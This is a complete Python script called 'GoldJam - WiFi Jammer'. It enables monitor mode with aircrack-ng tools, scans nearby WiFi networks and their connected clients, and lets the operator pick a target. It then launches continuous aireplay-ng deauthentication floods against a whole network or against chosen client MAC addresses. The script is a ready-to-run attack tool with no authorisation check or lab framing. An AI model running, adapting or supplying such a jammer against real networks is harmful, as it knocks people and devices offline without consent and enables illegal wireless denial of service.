#!/usr/bin/env python3

# GoldJam - WiFi Jammer
# Author: GoldSkull-777
import os
import subprocess
import time
import sys
import shutil
import signal
# ==================== Auto Dependency Installer ====================
def install_if_missing():
    def is_installed(cmd):
        return shutil.which(cmd) is not None
    def apt_install(pkg):
        subprocess.call(f"sudo apt-get install -y {pkg}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    def pip_install(pkg):
        subprocess.call(f"python3 -m pip install {pkg}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[bold green][+] Checking dependencies...[/bold green]")
    if not is_installed("airmon-ng"):
        print("[bold red][!] Installing aircrack-ng suite...[/bold red]")
        apt_install("aircrack-ng")
    try:
        import rich
    except ImportError:
        print("[bold red][!] Installing Python module 'rich' for colorful output...[/bold red]")
        pip_install("rich")
install_if_missing()
# ==================== Imports ====================
from rich import print
from rich.table import Table
from rich.live import Live
from rich.console import Console
# ==================== Utility ====================
def clear(): os.system('clear' if os.name == 'posix' else 'cls')
def run(cmd): return subprocess.getoutput(cmd)
def get_interfaces():
    # Improved: actually finds wireless interfaces
    output = run("iw dev")
    interfaces = []
    current = None
    for line in output.splitlines():
        if "Interface" in line:
            current = line.split()[-1]
            interfaces.append(current)
    return [i for i in interfaces if i and "wlan" in i.lower() or "wl" in i.lower()] # filter likely wifi
def enable_monitor(iface):
    print(f"\n[bold green][+] Enabling monitor mode on {iface}...[/bold green]")
    subprocess.call("sudo airmon-ng check kill", shell=True)
    # Also unblock in case rfkill blocked
    run("sudo rfkill unblock wifi")
    run("sudo rfkill unblock all")
    subprocess.call(f"sudo airmon-ng start {iface}", shell=True)
    time.sleep(2) # give it time
    # Detect the new monitor interface name
    mon_iface = None
    for possible in [f"{iface}mon", iface]:
        if run(f"iw dev {possible} info 2>/dev/null") and "type monitor" in run(f"iw dev {possible} info"):
            mon_iface = possible
            break
    if not mon_iface:
        print("[bold yellow][!] Could not detect monitor interface — trying common names...[/bold yellow]")
        mon_iface = f"{iface}mon"
    print(f"[bold green][i] Using monitor interface: {mon_iface}[/bold green]")
    return mon_iface
def restore(iface):
    print("\n[bold green][+] Restoring adapter to managed mode and restarting services...[/bold green]")
    run(f"sudo airmon-ng stop {iface} 2>/dev/null")
    run("sudo systemctl start NetworkManager")
    run("sudo systemctl start wpa_supplicant")
    print("[bold green][+] Adapter restored and ready to reconnect.[/bold green]")
def cleanup(file):
    for ext in ["-01.csv", "-01.cap", "-01.netxml", "-01.kismet.csv", "-01.log.csv"]:
        path = f"{file}{ext}"
        if os.path.exists(path):
            os.remove(path)
# ==================== CSV Parser (with more client details) ====================
def parse_networks(file):
    nets = []
    client_dict = {} # bssid -> clients
    csv_path = f"{file}-01.csv"
    if not os.path.exists(csv_path):
        return nets
    try:
        with open(csv_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        in_ap_section = True
        for line in lines:
            line = line.strip()
            if not line: continue
            if "Station MAC" in line:
                in_ap_section = False
                continue
            fields = [f.strip() for f in line.split(',')]
            if len(fields) < 5 or "BSSID" in line.upper() or "Station MAC" in line:
                continue
            if in_ap_section:
                if len(fields) >= 14 and ':' in fields[0]:
                    bssid = fields[0]
                    channel = fields[3]
                    power = fields[8]
                    essid = fields[13].strip() if fields[13].strip() else '(Hidden)'
                    nets.append({'bssid': bssid, 'ch': channel, 'pwr': power, 'essid': essid, 'clients': []})
                    client_dict[bssid] = nets[-1]['clients']
            else:
                if len(fields) >= 7 and ':' in fields[0]:
                    mac = fields[0]
                    first = fields[1][:19] if len(fields[1]) > 19 else fields[1]
                    last = fields[2][:19] if len(fields[2]) > 19 else fields[2]
                    pwr = fields[3]
                    pkts = fields[4]
                    assoc = fields[5].strip() if len(fields) > 5 else ""
                    probed = ", ".join([p.strip() for p in fields[6:] if p.strip()]) if len(fields) > 6 else "-"
                    if assoc in client_dict:
                        client_dict[assoc].append({
                            'mac': mac,
                            'first': first,
                            'last': last,
                            'power': pwr,
                            'packets': pkts,
                            'probed': probed
                        })
    except Exception as e:
        print(f"[yellow][!] CSV parse issue: {e}[/yellow]")
    return nets
# ==================== Live Scan ====================
def live_scan(iface, file):
    print(f"\n[bold cyan][+] Starting live scan on [bold yellow]{iface}[/bold yellow].[/bold cyan]")
    print("[bold green][*] PRESS [CTRL + C] once when your target appears in the list below to continue.[/bold green]")
    print("[bold magenta][*] Tip:[/bold magenta] Let it run for 10–20 seconds for clients to appear.\n")
    cmd = ["sudo", "airodump-ng", "--write", file, "--output-format", "csv", iface]
    process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
    try:
        with Live(refresh_per_second=1, screen=True) as live:
            while True:
                table = Table(title="[bold magenta]📡 GoldJam Live Scan — Nearby WiFi Networks[/bold magenta]", show_header=True, header_style="bold blue")
                table.add_column("No", style="bold yellow", justify="center")
                table.add_column("ESSID", style="cyan", overflow="fold")
                table.add_column("BSSID", style="red")
                table.add_column("CH", style="magenta", justify="center")
                table.add_column("PWR", style="green", justify="center")
                table.add_column("Clnts", style="white", justify="center") # tiny helpful addition
                nets = parse_networks(file)
                if nets:
                    for idx, n in enumerate(nets):
                        cl_count = len(n['clients'])
                        table.add_row(
                            str(idx+1),
                            n['essid'],
                            n['bssid'],
                            n['ch'],
                            n['pwr'],
                            str(cl_count) if cl_count else "-"
                        )
                else:
                    table.add_row("-", "[yellow]Scanning... (wait longer or check adapter)[/yellow]", "-", "-", "-", "-")
                live.update(table)
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n[bold green][+] Scan stopped. Processing captured data...[/bold green]")
    finally:
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
        time.sleep(1.5)
# ==================== Deauth All (Broadcast) ====================
def deauth_all(bssid, ch, iface):
    run(f"sudo iwconfig {iface} channel {ch}")
    print(f"\n[bold red][+] Broadcasting deauth to entire network: {bssid} (CH {ch})[/bold red]")
    print("[bold yellow][*] PRESS [CTRL + C] to stop.[/bold yellow]\n")
    try:
        subprocess.call(f"sudo aireplay-ng --deauth 0 -a {bssid} {iface}", shell=True)
    except KeyboardInterrupt:
        print("\n[bold cyan][+] Jam stopped.[/bold cyan]")
# ==================== Targeted Deauth ====================
def deauth_specific(bssid, ch, iface, client_macs):
    run(f"sudo iwconfig {iface} channel {ch}")
    print(f"\n[bold red][+] Targeted deauth on {bssid} (CH {ch})[/bold red]")
    print(f"[bold cyan]→ Targeting {len(client_macs)} client(s): {', '.join(client_macs)}[/bold cyan]")
    print("[bold yellow][*] PRESS CTRL + C to stop.[/bold yellow]\n")
    try:
        if len(client_macs) == 1:
            subprocess.call(f"sudo aireplay-ng --deauth 0 -a {bssid} -c {client_macs[0]} {iface}", shell=True)
        else:
            print("[bold cyan][*] Multiple clients → sending burst deauth cycles[/bold cyan]")
            while True:
                for mac in client_macs:
                    subprocess.call(f"sudo aireplay-ng --deauth 25 -a {bssid} -c {mac} {iface}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(0.6)
    except KeyboardInterrupt:
        print("\n[bold cyan][+] Targeted attack stopped.[/bold cyan]")
# ==================== Banner ====================
SKULL = """\
[bold red]\
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+-........:=*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%=:..            ...-#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*..................    ..=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%:.....:+%@@@@@@@@@@%*-......#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#....-*@@@@@@@%##%%@@@@@@#=....=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#...-%@@@@*:..........:+%@@@@=...=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:..:@@@%:.................#@@@=...*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*....-+:....:*@@@@@@@@#-.....==.. .:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=.. ......:%@@@@@%#%@@@@%=........ :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+...     .+@@#:......:*@@#..       -@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#.....  ....................  .....+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...:...  ..  .-#@@%=..     ...:...#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=...-:.      -@@@@@@+.     ..=...:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*..==..    ..-@@@@@@+.     ..-*..+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+......:::...:#%%%=...:::......=%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%:..=#@@@@@@@@#:.....*@@@@@@@@%+:.:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+..#@@@@@@@@@@@-.  .:@@@@@@@@@@@%:.:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:.-@@@@@@@@@@@%.. .+@@@@@@@@@@@*..#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%:.-@@@@@@@@@@*:.....+%@@@@@@@@@*..*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@....-#@@@#+-:...:##-....-=*%@@#=....%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+...............@@@@-..............:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-.... ..    .*@##@%..     .....:#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#=--=-...  .=@+-@*.. ...-+=--*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-.  ......... .:#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#:.            ..*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#:.....   .....+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#++:..:.:=+*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
               
               GoldJam v1.0.1 - WiFi Jammer\
                Author: GoldSkull-777\
[/bold red]\
"""
# ==================== Main ====================
def main():
    clear()
    print(SKULL)
    interfaces = get_interfaces()
    if not interfaces:
        print("[bold red][-] No wireless interfaces found. Exiting.[/bold red]")
        print("[dim]Run 'iw dev' or 'airmon-ng' manually to check your adapter.[/dim]")
        return
    for i, iface in enumerate(interfaces):
        print(f"[bold green][{i+1}] {iface}[/bold green]")
    while True:
        s = input("\n[+] Select interface number to use: ").strip()
        if s.isdigit() and 1 <= int(s) <= len(interfaces):
            iface = interfaces[int(s)-1]
            break
    mon_iface = enable_monitor(iface)
    file = "goldjam_scan"
    live_scan(mon_iface, file)
    nets = parse_networks(file)
    if not nets:
        print("[bold red][-] No networks parsed. Possible reasons:[/bold red]")
        print("[yellow]- Adapter does not support monitor mode[/yellow]")
        print("[yellow]- Too far from networks or weak signal[/yellow]")
        print("[yellow]- Try 'sudo rfkill list' and unblock if needed[/yellow]")
        print("[yellow]- In VM? Passthrough/USB issues common[/yellow]")
        cleanup(file)
        restore(mon_iface)
        return
    print("\n[bold magenta]Available Networks:[/bold magenta]")
    print("%-3s %-25s %-20s %-5s %-6s" % ("No", "ESSID", "BSSID", "CH", "PWR"))
    print("-"*70)
    for i, n in enumerate(nets):
        print("%-3s %-25s %-20s %-5s %-6s" % (
            str(i+1),
            n['essid'][:24],
            n['bssid'],
            n['ch'],
            n['pwr']
        ))
    while True:
        s = input("\n[+] Select target network number to jam: ").strip()
        if s.isdigit() and 1 <= int(s) <= len(nets):
            n = nets[int(s)-1]
            break
    bssid = n['bssid']
    ch = n['ch']
    essid = n['essid']
    clients = n.get('clients', [])
    if clients:
        print(f"\n[bold green][+] Found {len(clients)} client(s) connected to '{essid}'[/bold green]")
        # Detailed colorful table of connected devices
        console = Console()
        table = Table(title=f"[bold cyan]Connected Devices → {essid}[/bold cyan]", show_header=True, header_style="bold blue")
        table.add_column("No", style="bold yellow", justify="center")
        table.add_column("MAC", style="bold red")
        table.add_column("First Seen", style="cyan")
        table.add_column("Last Seen", style="cyan")
        table.add_column("Signal", style="green", justify="center")
        table.add_column("Pkts", style="white", justify="center")
        table.add_column("Probed SSIDs", style="magenta", overflow="fold")
        for idx, cl in enumerate(clients, 1):
            probed_short = cl['probed'][:60] + "..." if len(cl['probed']) > 60 else cl['probed']
            table.add_row(str(idx), cl['mac'], cl['first'], cl['last'], cl['power'], cl['packets'], probed_short)
        console.print(table)
        # Original client selection logic
        prompt = "[+] Do you want to target SPECIFIC client(s) only? [y/N]: "
        resp = input(prompt).strip().lower()
        if resp in ('y', 'yes', 'ye', 'Y', 'YES'):
            print("\n[bold magenta]Connected Clients:[/bold magenta]")
            print(" No.  MAC Address           PWR ")
            print("-" * 40)
            for i, cl in enumerate(clients, 1):
                print(f"{i:>3}   {cl['mac']}   {cl['power']:>4}")
            selected_macs = []
            while not selected_macs:
                inp = input("\n[+] Client numbers to target (comma sep, 'all', or empty = all): ").strip().lower()
                if inp in ('all', ''):
                    selected_macs = [cl['mac'] for cl in clients]
                else:
                    try:
                        idxs = [int(x.strip())-1 for x in inp.split(',') if x.strip().isdigit()]
                        selected_macs = [clients[i]['mac'] for i in idxs if 0 <= i < len(clients)]
                        if not selected_macs:
                            print("[bold red]No valid numbers entered.[/bold red]")
                    except:
                        print("[bold red]Invalid format. Use numbers like: 1,3,5[/bold red]")
            if selected_macs:
                deauth_specific(bssid, ch, mon_iface, selected_macs)
            else:
                print("[bold yellow]No clients selected → falling back to full network deauth[/bold yellow]")
                deauth_all(bssid, ch, mon_iface)
        else:
            print("[bold yellow]Full network deauth selected.[/bold yellow]")
            deauth_all(bssid, ch, mon_iface)
    else:
        print("[bold yellow][!] No clients detected in capture → doing broadcast deauth[/bold yellow]")
        deauth_all(bssid, ch, mon_iface)
    cleanup(file)
    restore(mon_iface)
    print("\n[bold green][+] GoldJam finished. Have a nice day.[/bold green]\n")
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[bold cyan][+] Interrupted. Cleaning up...[/bold cyan]")
        for mon in ['wlan0mon', 'wlan1mon', 'wlp2s0mon', 'wlp3s0mon']:
            if os.path.exists(f"/sys/class/net/{mon}"):
                restore(mon)
                break


